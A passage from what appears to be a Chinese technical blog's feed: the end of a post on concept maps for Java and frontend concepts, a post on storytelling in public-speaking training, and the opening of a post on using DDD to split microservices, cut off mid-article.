的请求和响应进行，而我们做的应用程序（WAR）只是一个寄生兽，挂靠在 Servlet 容器上负责处理业务逻辑。</p><p>库最具有代表性的是 Spring。Spring 这个词本身只是只一个 IOC 库，后来不断发展，Spring 实际上衍生成 Spring IOC、Spring MVC、Spring Data 等库的一个集合。最终由 Spring boot 整合成一个完整的框架。</p><p>而对数据库的操作又是一堆概念。Java 程序使用 JDBC 的驱动（数据库具体的 Driver）连接数据库，人们又希望使用 ORM 技术让对象和数据库记录同步，这一实现主要有 Hibernate、TopLink，Java 社区做了规范称为 JPA。Spring data JPA 又对 JPA 做了封装使之在 Spring 环境下更易用。</p><p>通过梳理这些概念可以给学习 Java 编程的新人推荐一个合适的学习路线：计算机基础-&gt;计算机网络-&gt;Java 基础-&gt; Servlet -&gt; Spring IOC -&gt; Spring MVC-&gt; Spring Boot。没有前置概念的铺垫，直接学习 Spring Boot 是相当痛苦的。</p><h2 id="前端开发概念点"><a href="#前端开发概念点" class="headerlink" title="前端开发概念点"></a>前端开发概念点</h2><p>最近很火的 Vue 是一个框架还是一个库，亦或者是一个开发体系？</p><p>随着前端开发工程化的发展，现代前端开发体系爆炸性的增长，每天都在出现新概念，那么学习前端到底该学些什么呢。下面我整理了一个前端常见概念点的概念图：</p><p><img src="/thinking/thinking/concept-map/260375518.jpg" alt="frontend.jpg"></p><p>前端开发在 Nodejs 出现之前还是非常简单和容易理解的，在浏览器中运行的页面无非是 HTML、CSS、JavaScript。Nodejs 把 Chrome 的 JavaScript 引擎单独拿出来运行 JavaScript 脚本，并提供了很多操作系统的 API，形成独立的运行平台。JavaScript 的应用场景从浏览器中脱离出来，变得无比开阔。</p><p>Nodejs 提供了网络相关的 API，于是 JavaScript 便可以通过通过 TCP 协议编写 Socket 代码，从而进一步实现 HTTP 协议，得到 WEB 服务编程的能力。</p><p>Nodejs 也提供了文件相关的 API，JavaScript 便能够具备文件生成、JavaScript 的压缩、Less 到 CSS 的转换等前端工程构建的相关能力。于是 JavaScript 可以反过来对 JavaScript 代码文本处理，构建 JavaScript 项目（无论前端还是后端）。从最开始利用 grunt 对JavaScript 代码进行简单的压缩、混淆、模板替换等，到后面的 gulp 更灵活的构建工程，以及现在的 webpack 对前端资源彻底的整合。</p><p>Nodejs 平台上也可以运行包管理程序来对各种依赖管理，这就是 npm 和 yarn，这就是 Nodejs、npm、JavaScript 的概念关系。</p><p>同理，对于前端各种库来说，它们的关系通过概念图也能表达的更为清晰。React 和 Vue 都只是发布在 npm 中的一个库，前端项目需要这些各种库作为原料，并通过构建工具来做成蛋糕，并放到浏览器中呈现给用户。</p><p>以上就是前端开发生态发展的基本逻辑。</p><h2 id="构建你自己的概念图"><a href="#构建你自己的概念图" class="headerlink" title="构建你自己的概念图"></a>构建你自己的概念图</h2><p>想要表达对概念的理解，你可以很容易的构建出自己的概念图。</p><p>一个典型的概念图主要有节点、连接线两种元素构成，分别对应了概念、概念的联系，两个相连的概念之间可以构成逻辑命题，命题应该能通过节点和连接线读出。</p><p>绘制概念的方法非常简单，你只需要在纸上或者专用的软件（下载链接见文章附录）罗列出相关概念然后使用连接点标记出概念的关系即可。诺瓦克给出了一个非常详细的构建概念图的流程，这非常适用于教育专家来处理日常遇到的大量复杂的信息和概念，但对于大众来说稍显冗长。我做了一点简化和改进，归纳如下：</p><ul><li><strong>确定概念图需要解决的焦点问题。</strong> 例如我需要解决”鱼香肉丝里面有没有鱼“的问题，或介绍 ”鱼香肉丝“ ，围绕着鱼、动物、鱼香、调料、烹饪、口味、肉丝、鱼香肉丝、川菜等概念来构建概念图，然后得到命题 ”鱼香是一种口味“，”鱼香的调料起源是用来烹鱼“ ，从图中我们得不到 ”鱼香有鱼“ 这样的命题。在解决这个问题的过程中，鱼生活在池塘中，池塘、水草等概念就没有意义了。</li><li><strong>罗列关键概念。</strong> 围绕着焦点为题来寻找概念，但是概念不宜多，在罗列概念时，尝试对概念进行定义，使用- 更准确地词替换模糊的词。例如讨论编程时大家喜欢用”语言“这个词，尽量使用”编程语言“这类准确地词</li><li><strong>寻找概念的冲突和二义性，分化概念。</strong> 《公孙龙子》在三脚鸡的辩论中，”鸡有脚，数数时，鸡有两只脚，加起来有三只脚“。这里的鸡的概念有集合个体两个内涵。可以分为”鸡“和”一只鸡“两个概念。《公孙龙子》中类似的例子还有 “白马非马”的著名辩论</li><li><strong>构建联系，得到命题。</strong> 将分化后的概念，通过连接线连接起，连接过程中给出一个合理的连接词，概念+连接词+概念成为一个完整的命题。例如 ”鱼香是一种口味“。</li></ul><p><img src="/thinking/thinking/concept-map/837205789.png" alt="process.png"></p><p>上面是从操作流程上归纳创建概念图的方法，另外在构建的逻辑上，概念的关系一般有下面两条线索：</p><ul><li><strong>概念的抽象程度。</strong> 这种思考方画出来的图往往是一个树状，从上到下是概念抽象层次的逐渐收敛的过程。例如计算机科学-&gt;计算机硬件-&gt; CPU -&gt; Inter CPU-&gt; I5。概念从从抽象逐渐到具体，这是一种理想的概念图构建方法，读者能从上到下找到清晰地逻辑关系和明确的命题。</li><li><strong>概念的联系紧密程度。</strong> 画出来的图往往是一个网状，从上到下是概念联系逐渐从紧密到疏远的过程。Java-&gt;编程语言-&gt;编译型语言，可能两个概念没有直接关联了。这是现实中很正常的情况，一术语往往具有多个概念，概念之间又不断延伸和交叉。</li></ul><p>概念图和思维导图的最大区别就在这两条线索上。概念图是用来表达概念的关系，节点之间应该具有逻辑关系，可以说是收敛的；思维导图是用来促进创造性思维的，条目之间具有引导的关系，可以说是发散的。</p><h2 id="使用概念图的要点"><a href="#使用概念图的要点" class="headerlink" title="使用概念图的要点"></a>使用概念图的要点</h2><p>概念图其实只是反映你思维逻辑的一个可视化工具，概念图能清晰分析问题的前提是思维和逻辑是清晰地。绘制概念图，首先需要对“概念”理解和定义清楚，“概念” 这个词从古到今、从外到中，有非常多的解释，有认知论、哲学、教育学等解释。</p><p>概念图的发明者罗瓦克对概念的定义非常朴素：从事件或对象中感知到的规律或模式，可以打上一个标签，这个标签就是概念。</p><p>维基百科的定义是：概念是抽象的、普遍的想法，是充当指明实体、事件或关系的范畴或类的实体。通俗来说，概念是人对事物认识的基本元素，例如“马”、“天空”。现代哲学把概念的内容和范围定义为了外延和内涵。通过外延和内涵指导区分从一个概念演变出来的新的概念。例如“计算机”的外延可以延伸为“计算机维修”。</p><p><img src="http://www.printf.cn/usr/uploads/2019/09/610535295.png" alt="concept.png"></p><p>概念图就是用来表达概念之间的延伸关系和抽象程度的，从而达到梳理概念的目的。 笛卡尔将概念的清晰度和抽象程度称为是概念的特征。</p><p>每个人构建概念和概念之间的逻辑关系都是不一样的，所以每个人绘制概念图都是不一样的。</p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p>在实际使用概念图有一些比较常见的问题，我也会犯一些错误。这是因为自然语言本来就是不准确的，概念也具有人主观认识的成分。我们来看下在绘制概念图的过程中，常见的误区是什么，也可以通过这些问题来作为审视概念图是否优良的方法。</p><h3 id="主题范围失控，概念图没有焦点"><a href="#主题范围失控，概念图没有焦点" class="headerlink" title="主题范围失控，概念图没有焦点"></a>主题范围失控，概念图没有焦点</h3><p>做出取舍，解决该解决的问题，解决不了的问题收敛主题，并再画一张图。例如我想要辨析的主要内容是：Java、JVM、Spring 等几个概念的逻辑关系，我开始想绘制一个非常大的主题“服务器编程”，这样的话我就必须把 PHP、Go 等其他语言纳入了，但这些内容和我想要辨析的主题关系并不大。于是我最终选择收敛主题到 “Java服务器编程”，把焦点聚焦到 Java 和 Spring 上。</p><p>如果需要表达 Java、PHP 概念之间的关系，我需要发散主题 “服务器编程” 然后进行绘制，但是不会加入 Spring 相关的内容，概念图的深度也可能不会到达 Spring mvc、Zend PHP 这样层次的深度。</p><p>概念图不必追求大而全。</p><h3 id="概念层次不清晰"><a href="#概念层次不清晰" class="headerlink" title="概念层次不清晰"></a>概念层次不清晰</h3><p>把概念图绘制成流程图是最容易犯的错误。概念图是表达概念的抽象层次关系，用概念图表达多个时间关系不同但抽象层次相同的概念没有意义，你应该使用一个流程图来表达。</p><p>在电商领域中，购物车、订单、支付记录，下单流程中的几个关键概念。这几个概念在抽象上是类似的。上图的左边部分是一个不好的示例，虽然表达了概念之间的生成关系，但是这些概念的内涵和外延无法在图中表达。</p><p>诺瓦克在《概念图》一书中给出评价概念图的方法之一是利用拓扑分类学，主题应该体现出 “渐进分化”的特点。</p><h3 id="语义描述不当"><a href="#语义描述不当" class="headerlink" title="语义描述不当"></a>语义描述不当</h3><p>概念图节点是概念，概念是认知世界的元素，按照诺瓦克定义来说，就是给印象中的事物打一个标签。概念应该有名词（包括抽象名词）、动名词、形容词，而概念之间的关系可以为动词、介词、副词。</p><p>好的概念图还需要对读者友好，阅读者能组合概念和概念的联系变成条有意义的命题，例如 “马分为白马“。虽然不一定具有语法上的完整性，但是逻辑关系非常重要。</p><h2 id="参考书目和附录"><a href="#参考书目和附录" class="headerlink" title="参考书目和附录"></a>参考书目和附录</h2><ul><li>专用概念图绘制工具 <a href="https://cmap.ihmc.us/" target="_blank" rel="noopener">https://cmap.ihmc.us</a></li><li>通用画图工具 <a href="https://www.draw.io/" target="_blank" rel="noopener">https://www.draw.io/</a></li><li>概念图的维基百科 <a href="https://en.wikipedia.org/wiki/Concept_map" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Concept_map</a></li><li>笛卡尔《方法论》</li><li>诺瓦克《概念图》</li><li>公孙龙《公孙龙子》</li></ul>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>怎样讲好一个故事</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/speaking-skills/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/speaking-skills/</url>
      
        <content type="html"><![CDATA[<p>个能张嘴说话的人都是演讲高手，如果台下的人愿意认真听的话。</p><p>如果你是马云，一句话不说都有人在台下陪着坐一晚上。如果你是雷军，即使天天被吐槽仙桃口音，也会有无数人坚持把发布会看完。对于普通人而言，能想办法让听众注意到你、自主的听完整段讲话，就已经是莫大的成功。<strong>讲好一个故事，成为演讲高手的开始。</strong></p><p>在一次毕业生培训中，客户要求我们在毕业答辩前夕安排一些额外的课程。我们考虑到答辩前夕置入太多新的内容会影响他们答辩，于是我们设计了和答辩有相关的一次演讲课。</p><p>这次演讲课非常朴素，设计的思路和常规课程略微不同。课程的设计思路是让学员先忘记演讲技巧，通过讲一个自己的故事或者印象最深的经历，尽可能让听众记住自己演讲的关键信息。听众记住演讲的内容越多，越被演讲者吸引，演讲则越成功。</p><p>人的天性是喜欢听故事，而非听人说教；喜欢看电影，而非上培训课。利用讲故事的方式，让学员在一个安全、舒适的空间找到自信和适合自己的演讲方式，并通过听众的反馈提炼演讲技巧。</p><p>在课程开始前给予所有学员10分钟准备时间，并做了一些要求：</p><p>对演讲者而言，在演讲期间需要注意下面几点：</p><ol><li>忘掉所有演讲技巧，不必给自己增加负担</li><li>提前组织一下语言，不要求即兴演讲</li><li>尽可能让听众记住你</li></ol><p>对听众的要求，在听完演讲后，需要回答下面几个问题：</p><ol><li>记住了那些关键信息点，为什么我记住了这些信息?</li><li>为什么记住了这些信息?</li><li>回答如果XXX做，我会记住更多的信息?</li></ol><h2 id="关于变态杀人狂的故事"><a href="#关于变态杀人狂的故事" class="headerlink" title="关于变态杀人狂的故事"></a>关于变态杀人狂的故事</h2><p>这是第一个分享的故事，讲述了一段演讲者自己印象最深的观影体验。演讲中电影的名字叫 《杀人回忆》，是讲一宗连环奸杀案，被害人有十几岁的少女，也有71岁的老人。最终凶手被抓住，凶手是一个17岁的少年，并且极其普通，看似与凶悍的杀人犯毫不相关。发人深省的是变态杀人狂和外表并没有什么关系，这个和一般在影视作品中的认知差异极大。</p><p>演讲完成后，随着演讲的进行，被吸引的同学越来越多，听的同学表示记住的最多的信息是：</p><ol><li>71岁老奶奶被17岁少年奸杀</li><li>态杀人狂和外表没什么关系</li></ol><p>我问大家为什么会愿意听，并记住了这样的信息呢？</p><p>回答是人们喜欢故事，并且越是离奇的故事越愿意听，这是其一；第二是人们会对有认知差异的内容警觉，例如 “71岁老奶奶被17岁少年奸杀” 这种事情和平时的认知差异巨大。</p><p>从这个故事中，我抛出了一个演讲理论：<strong>制造冲突</strong>。把一个普通人的日常拍成电视剧，恐怕收视率为0，得亏的倾家荡产。但是讲述一个普通人突然中了彩票，又染上赌博，进而亏得倾家荡产，就能算稍微好一点的故事了。</p><p>冲突表现在几个方面：</p><ol><li><strong>认知冲突</strong>，在给学员播放过的 TED 视频中，有一个老奶奶的教学法，大意是通过引导自学就能得到和学校一样的学习效果。这就是一种典型的认知冲突，利用大众对教学认知差异，制造冲突。</li><li><strong>主题冲突</strong>，例如想要讲一个帝王将相的故事，往往都是先讲这个人在尚未飞黄腾达的时期的故事，然后要讲的主题才能有对比和冲突。</li><li><strong>情节冲突</strong>，每一部好的电影和小说都是情节冲突的好例子，《杜十娘怒沉百宝箱》中杜十娘和李甲相识到投江就是强烈的情节冲突。</li></ol><h2 id="关于刚毕业漂泊的故事"><a href="#关于刚毕业漂泊的故事" class="headerlink" title="关于刚毕业漂泊的故事"></a>关于刚毕业漂泊的故事</h2><p>这是一个几乎全场所有人都认真聆听的故事。</p><p>演讲者讲述了毕业之后离开自己大学所在城市，只身前往北京工作的经历。在北京每月工资只有 4000 元，除去房租、吃饭、通勤费用过后几乎没有剩余。工作期间内，因为担心丢失工作，在公司待的战战兢兢，不敢得罪任何一个人；因为手上没有积蓄，不敢出去玩，不敢生病；因为工作压力大，没有多余的时间，不敢恋爱。虽然在朋友和家人的支持下，在北京能勉强生存，但是还是选择了回到郑州老家。没有像电视中，到大城市打拼并最终走上人生巅峰的结局，而大部分人都选择或者被迫了接受现实。</p><p>这一次的故事，演讲者和部分听的同学哭了，这一次大家记住的信息是：</p><ol><li>刚毕业的时间</li><li>4000 收入的北漂生活</li><li>最终回到家乡工作的大学生</li></ol><p>为什么这次所有人都认真听了，并记住了这些关键信息呢？</p><p>因为我们的听众全都是刚毕业的大学生，演讲者说的每一个场景都好像发生在自己身上一样，每一句话都感同身受。</p><p>从这次演讲，我们能得到另外一个有力的演讲理论：<strong>大众认同和共情</strong>。</p><p>每一场激烈的争论，是想要别人站在自己的角度思考问题；每一次看完电影后被打动，是因为电影表达了自己也想要的表达的东西；每一次朋友圈转发的文章，是因为文章写了自己也想说的话。在心理上，人们乐于接受和自己相同的观点，以及认同和自己相同的经历。</p><p>站在大多数听众的角度讲故事，讲出听众看到的、听到的、想到的内容，得到所有听众的认同和共情，这就是演讲中的的核武器。</p><h2 id="回顾演讲技巧"><a href="#回顾演讲技巧" class="headerlink" title="回顾演讲技巧"></a>回顾演讲技巧</h2><p>还有很多很有意思的故事，也从这些演讲中得到更多的演讲经验，限于篇幅，无法一一列举。在课程结束前，和同学们一起总结了一些演讲技巧，如果做到这些，他们表示作为听众会更愿意记住更多信息：</p><h3 id="有故事、有主题"><a href="#有故事、有主题" class="headerlink" title="有故事、有主题"></a>有故事、有主题</h3><p>一次只讲一个完整的故事，每个故事都有一个独立的主题。人们喜欢听故事，而非听人讲道理。如果我们观察 TED 的演讲方式和领导的讲话，非常明显的区别就是 TED 的演讲更像是一个朋友在分享自己的经历，而领导讲话站的姿态则完全不同。讲故事的过程中切记不要好为人师，多使用 “我们” 这样的拉近关系的词汇，不要使用 “我” “你们” 这类明显强调个人和对立的词汇。</p><h3 id="有准备"><a href="#有准备" class="headerlink" title="有准备"></a>有准备</h3><p>作为普通人很少能完全做到即兴演讲，如果有充足的准备工作，可以让演讲做的更好。可以在卡片或者报事贴上快速组织演讲内容，“总-分-总” 是一种的较好的组织演讲稿的思维方式，这种组织表达的方式也叫 “钻石表达法”，两头小，中间大。</p><h3 id="声音够大、声音够有力、气息足、语速慢"><a href="#声音够大、声音够有力、气息足、语速慢" class="headerlink" title="声音够大、声音够有力、气息足、语速慢"></a>声音够大、声音够有力、气息足、语速慢</h3><p>让在场的所有人都能听得清楚，大部分人演讲时犯得第一个错误就是声音太小。避免语速过快，当语速够慢的时候，每一字会变得更清楚，可以通过和语音助手对话练习，如果语音助手能识别，说明语速适中、吐字清晰、容易识别。让讲话变得清晰、有力，说话时胸腔吸取足量的空气，说一句话用完，然后再深吸一口气，开始下一句。</p><h3 id="有场景，有细节"><a href="#有场景，有细节" class="headerlink" title="有场景，有细节"></a>有场景，有细节</h3><p>人们都是感官动物，容易理解具体的、有场景、可触摸的内容，而非抽象的内容。例如在讲在北京租的房子破的时候，可以举个例子说搬家的时候，磕了一下墙壁，然后一大块墙皮掉落下来。画面感可以通过补充细节实现，多使用感官词汇，例如能看到的、摸到的、听到的、闻到的。</p><h3 id="制造冲突"><a href="#制造冲突" class="headerlink" title="制造冲突"></a>制造冲突</h3><p>人们喜欢听和自己认知不同的、前后有起伏、情节有变化的内容。制造冲突不仅可以用于演讲，还可以用于写作、营销。明朝文学家徐渭就是制造冲突的高手：</p><p>明朝文学家徐渭曾应邀去参加一位老婆婆的生日宴会，其四个儿子请徐渭为其母题词。徐渭提笔挥毫：”这个婆婆不是人。”满堂宾客大失神色。而徐渭不慌不忙继续写到：”九天神女下凡尘。”四个儿子与众宾客顿时眉开眼笑，齐声喝彩称颂。殊不知徐渭又接着写出一句：”生的儿子都是贼。”此时连老太太也勃然大怒了。可徐渭笔峰一转写下最后一句：”偷来仙桃孝母亲。”引得宾客无不拍手叫绝。</p><h3 id="寻求共鸣，感同身受"><a href="#寻求共鸣，感同身受" class="headerlink" title="寻求共鸣，感同身受"></a>寻求共鸣，感同身受</h3><p>站在和大多数听众的背景下讲故事，例如项目管理方面的内容显然不适合毕业生，而毕业漂泊的经历，则能打动大部分有过类似经历的过来人。</p><h3 id="记忆点"><a href="#记忆点" class="headerlink" title="记忆点"></a>记忆点</h3><p>找到一些记忆点，这个在心理学中称为心锚，属于条件反射的一种形式。我分享了一个故事，地点在河北，但是我没有用河北，而是选择了 “白洋淀”，因为听众大多在中学学过孙犁对 “白洋淀” 的描写。人们很容易去寻找记忆中的画面和当前听到的词建立联系，进而被记住。</p><h3 id="避免过多肢体动作"><a href="#避免过多肢体动作" class="headerlink" title="避免过多肢体动作"></a>避免过多肢体动作</h3><p>身体无意义的晃动，表达了不安和焦虑，容易分散听众的注意力。注意区别讲课时刻意的走动。</p><h3 id="富有感情"><a href="#富有感情" class="headerlink" title="富有感情"></a>富有感情</h3><p>很多感恩课、激励课，都是通过极其富有感情的方法演讲，但这些感情是通过刻意调动听众得来的。例如感恩演讲往往利用父母的付出、老师的辛苦，来实现感情操控。而如果我们自己所演讲的故事是来源真实经历，往往会带来意想不到的效果。</p><h3 id="缀词过多"><a href="#缀词过多" class="headerlink" title="缀词过多"></a>缀词过多</h3><p>缀词过多，就像大脑在放屁，避免无意义的缀词。例如很多明星喜欢说“然后”、“呃”、“这个” 等无意义的词汇，在演讲课上，我观察到很多人都有这个问题（我自己也有这个问题），自己基本上察觉不到。这是因为大脑的思考跟不上说话，解决的方法是说慢一点，给大脑一些时间。或者，做更多的准备。</p><h3 id="寻求观点认同，但也要有自己的立场"><a href="#寻求观点认同，但也要有自己的立场" class="headerlink" title="寻求观点认同，但也要有自己的立场"></a>寻求观点认同，但也要有自己的立场</h3><p>故事的结尾，应该有自己的看法和态度，才能让演讲不仅仅是一个故事，达到升华。但需要注意，人们更容易接受自己想要接受的观点，所以结束的观点请符合主流价值观。人们愿意接受相同的观点的同时也会被不同的观点吸引注意力，这就是我们开始说的冲突，合理运用冲突和认同是演讲的利器。</p><p>所以常见的模式是把冲突放到开头，共情用到中间，认同放到最后：</p><ul><li>通过问题制造冲突</li><li>讲述故事，尽量利用共情产生共鸣</li><li>陈述观点和看法，匹配主流价值观，得到认同</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>课后讲北京漂泊那个故事的同学找到我说，老师，原来很多人和我的经历类似，这些话我从来没在公开场合说过，其实开始挺不好意思的，其他同学都那么优秀，不会像我这样窘迫。但是经过这次演讲，原来大部分人和我一样都是普通人，并且都不是一帆风顺的。</p><p>我想总结的第一点是，通过讲故事的方式练习演讲，确实增强了他们的自信，如果选用自己背景相关的故事，演讲非常自然。</p><p>另外一点是，我在鼓励其中一个想要上台，但非常害羞的一个同学时说的话。“其实没有那么多人关注你，你试试明天不要洗头上班就好了，你会发现同事都那么忙并没人在乎你是否出丑”。</p><p>最后一点，从这个课程本身我也学到很多，有一些人自然而然的就能运用演讲的技巧，但会在其他地方做的不足。例如其中一个同学演讲非常富有感情，但是没有面向和关注听众。想把其他人的技巧变成自己的能力，唯一的方法就是刻意练习。刻意练习必须形成肌肉记忆，就像学习英语，当我们想要表达一句话，但还需要在自己脑子里套用语法模式组织句子，这是远远不够的。</p><h2 id="附录-演讲技巧"><a href="#附录-演讲技巧" class="headerlink" title="附录 - 演讲技巧"></a>附录 - 演讲技巧</h2><ul><li>故事都有主题</li><li>有准备</li><li>声音够大、声音够有力、气息足</li><li>有场景，有细节</li><li>制造冲突</li><li>先讲故事，自然有结论</li><li>注意语速</li><li>寻求共鸣，感同身受</li><li>观点认同</li><li>记忆点</li><li>避免过多肢体动作</li><li>富有感情</li><li>缀词过多，就像大脑在放屁</li><li>说服力</li><li>有自己的立场</li></ul>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 DDD 指导微服务拆分的逻辑</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/the-logic-of-microservice-decouping-with-ddd/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/the-logic-of-microservice-decouping-with-ddd/</url>
      
        <content type="html"><![CDATA[<p>开发者在刚开始尝试实现自己的微服务架构时往往会产生一系列问题 ：</p><ul><li>微服务到底应该怎么划分？</li><li>一个典型的微服务到底应该有多微？</li><li>如果做了微服务设计，最后真的会有好处吗？</li></ul><p>回答上面的问题需要首先了解微服务设计的逻辑，科学的架构设计应该通过一些输入并逐步推导出结果，架构师要避免凭空设计和“拍脑门”的做法。</p><p><strong>解耦的单体应用和微服务系统在逻辑上是一样的。</strong> 对于服务拆分的逻辑来说，先设计高内聚低耦合的领域模型，再实现相应的分布式系统是一种比较合适的方式。服务的划分有一些基本的方法和原则，通过这些方法能让微服务划分更有操作性。最终在微服务落地实施时也能按图索骥，无论是对遗留系统改造还是全新系统的架构都能游刃有余。</p><h2 id="微服务拆分的几个阶段"><a href="#微服务拆分的几个阶段" class="headerlink" title="微服务拆分的几个阶段"></a>微服务拆分的几个阶段</h2><p>在开始划分微服务之前，架构师需要在大脑中有一个重要的认识：微服务只是手段，不是目的。</p><p>微服务架构是为了让系统变得更容易拓展、更富有弹性。在把单体应用变成靠谱的微服务架构之前，单体系统的各个模块应该是合理、清晰地。也就是说，从逻辑上单体系统和微服务没有区别，某种理想情况下微服务只是把单体系统的各个模块分开部署了而已（最近流行的monorepo把多个服务的代码仓库以模块的形式组织到了一起，证明了这一点）。</p><p>大量的实践教训告诉我们，混沌的微服务架构，比解耦良好的单体应用会带来更多麻烦。</p><p><img src="/技术架构/architecture/the-logic-of-microservice-decouping-with-ddd/4059565328.png" alt="chaotic-or-clear.png"></p><p>（混乱的微服务VS良好的单体）</p><p>开源社区为此进行了大量讨论，试图对系统解耦寻找一种行之有效的方法，因此具有十几年历史的领域驱动设计（DDD）方法论被重新认识。领域驱动设计立足于面向对象思想，从业务出发，通过领域模型的方式反映系统的抽象，从而得到合理的服务划分。</p><p>采用 DDD 来进行业务建模和服务拆分时，可以参考下面几个阶段：</p><ul><li>使用 DDD（领域驱动建模） 进行业务建模，从业务中获取抽象的模型（例如订单、用户），根据模型的关系进行划分限界上下文。</li><li>检验模型是否得到合适的的抽象，并能反映系统设计和响应业务变化。</li><li>从 DDD 的限界上下文往微服务转化，并得到系统架构、API列表、集成方式等产出。</li></ul><p><img src="http://www.printf.cn/usr/uploads/2019/09/3207223940.png" alt="decouple-miroservice-process.png"></p><p>（使用DDD划分微服务的过程）</p><h2 id="如何抽象？"><a href="#如何抽象？" class="headerlink" title="如何抽象？"></a>如何抽象？</h2><p>抽象需要找到看似无关事务的内在联系，对微服务的设计尤为重要。</p><p>假设有一天，你在某电商网站购买了一台空调，当你支付了空调订单的费用后，又让你再次支付安装订单费用，你肯定大为光火。原因仅仅可能是架构师在设计系统时，为空调这种普通产品生产了一个订单，而安装作为了另外业务逻辑生成了单独的订单。</p><p>你一定觉得这个例子太傻了，架构师不会这点都没考虑到，”安装“ 应该被抽象成一个产品，而”安装行为“可以作为另外一个服务实现。然而现实的例子比比皆是，电信或移动营业厅还需要用户分两步办理号卡业务、宽带业务。原始是不合适的抽象模型造成的，并最终影响了微服务的划分。</p><p>我们可以使用概念图来描述一些概念的抽象关系。</p><p><img src="/技术架构/architecture/the-logic-of-microservice-decouping-with-ddd/390078919.png" alt="product-concept-diagram.png"><br>（商品这一概念的概念图）<br>如果没有抽象出领域模型，就得不到正确的微服务划分。</p><h2 id="使用DDD进行业务建模"><a href="#使用DDD进行业务建模" class="headerlink" title="使用DDD进行业务建模"></a>使用DDD进行业务建模</h2><p>通过利用DDD对系统从业务的角度分析，对系统进行抽象后，得到内聚更高的业务模型集合，在DDD中一组概念接近、高度内聚并能找到清晰的边界的业务模型被称作限界上下文（Bounded Context）。</p><p>限界上下文可以视为逻辑上的微服务，或者单体应用中的一个组件。在电商领域就是订单、商品以及支付等几个在电商领域最为常见的概念；在社交领域就是用户、群组、消息等。</p><p>DDD的方法论中是如何找到子系统的边界的呢？</p><p>其中一项实践叫做事件风暴工作坊，工作坊要求业务需求提出者和技术实施者协作完成领域建模。把系统状态做出改变的事件作为关键点，从系统事件的角度触发，提取能反应系统运作的业务模型。再进一步识别模型之间的关系，划分出限界上下文，可以看做逻辑上的微服务。</p><p>事件是系统数据流中的关键点，类似于电影制作中的关键帧。在未建立模型之前，系统就像是一个黑盒，不断的刺探系统的状态的变化就可以识别出某种反应系统变化的实体。</p><p>例如系统管理员可以登录、创建商品、上架商品，对应的系统状态的改变是用户已登录、商品已创建、商品已经上架；相应的顾客可以登录、创建订单、支付，对应的系统状态改变是用户已登录、订单已创建、订单已支付。</p><p>于是可以通过收集上面的事件了解到，“哦，原来是商品相关事件是对系统中商品状态做出的改变，商品可以表达系统中某一部分，商品可以作为模型”。</p><p><img src="/技术架构/architecture/the-logic-of-microservice-decouping-with-ddd/993640989.png" alt="abstract-model.png"></p><p>（利用事件刺探业务黑盒并抽象出模型）</p><p>在得到模型之后，通过分析模型之间的关系得出限界上下文。例如商品属性和商品相对于用户、用户组关系更为密切，通过这些关系作出限界上下文拆分的基本线索。</p><p>其次是识别模型中的二义性，让限界上下文划分更为准确。</p><p>例如，在电商领域，另外一个不恰当设计的例子是：把订单中的订单项当做和商品同样的概念划分到了商品服务，但订单中的商品实际上和商品库中的商品不是同一个概念。当订单需要修改订单下的商品信息时，需要访问商品服务，这势必造成了订单和商品服务的耦合。</p><p>合理的设计应该是：商品服务提供商品的信息给订单服务，但是订单服务没有理由修改商品信息，而是访问作为商品快照的订单项。订单项应该作为一个独立的概念被划分到订单服务中，而不是和商品使用同一个概念，甚至共享同一张数据库表。</p><p><img src="/技术架构/architecture/the-logic-of-microservice-decouping-with-ddd/2331958680.png" alt="good-dependent.png"></p><p>（典型具有”二义性“陷阱的场景）</p><p>”订单下的商品“和”商品“在不同的系统中实际上表达不同的含义，这就是术语”上下文“的由来。一组关系密切的模型形成了上下文（context），二义性的识别能帮我们找到上下文的边界（bounded）。同样的例子还有 “订单地址” 和 “用户地址”的区别。</p><p>当然，在DDD中具体识别限界上下文的线索还很多，例如模型的生命周期等，我们会在后面的文章中逐步展开。在后续的文章中，我们会介绍更多关于 DDD 和事件风暴的思想和原理。</p><h2 id="验证和评审领域模型"><a href="#验证和评审领域模型" class="headerlink" title="验证和评审领域模型"></a>验证和评审领域模型</h2><p>前面我们说到限界上下文可以作为逻辑上的微服务，但并不意味着我们可以直接把限界上下文变成微服务。在这之前很重要的一件事情是对模型进行验证，如果我们得到的限界上下文被抽象的不良好，在微服务实施后并不能得到良好的拓展性和重用。</p><p>限界上下文被设计出来后，验证它的方法可以从我们采用微服务的两个目的出发：降低耦合、容易扩展，可以作为限界上下文评审原则：</p><p>原则1，设计出来的限界上下文之间的互相依赖应该越少越好，依赖的上游不应该知道下游的信息。（被依赖者，例如订单依赖商品，商品不需要知道订单的信息）。<br>原则2，使用潜在业务进行适配，如果能在一定程度上响应业务变化，则证明用它指导出来的微服务可以在相当一段时间内足以支撑应用开发。</p><p><img src="/技术架构/architecture/the-logic-of-microservice-decouping-with-ddd/1363541114.png" alt="model-2-context.png"><br>（一般抽象程度的领域模型）</p><p>上图是一个电信运营商的领域模型的局部，这部分展示了电信号码资源以及群组、用户、宽带业务、电话业务这几个限界上下文。主要业务逻辑是，系统提供了号码资源，用户在创建时会和号码资源进行绑定写卡操作，最后再开通电话或宽带业务。在开通电话这个业务流程中，号码资源并不需要知道调用者的信息。</p><p>但是理想的领域模型往往抽象程度、成本、复用性这几个因素中获取平衡，软件设计往往没有理想的领域模型，大多数情况下都是平衡各种因素的苟且，因此评审领域模型时也要考虑现实的制约。</p><p><img src="http://www.printf.cn/usr/uploads/2019/09/3780985474.png" 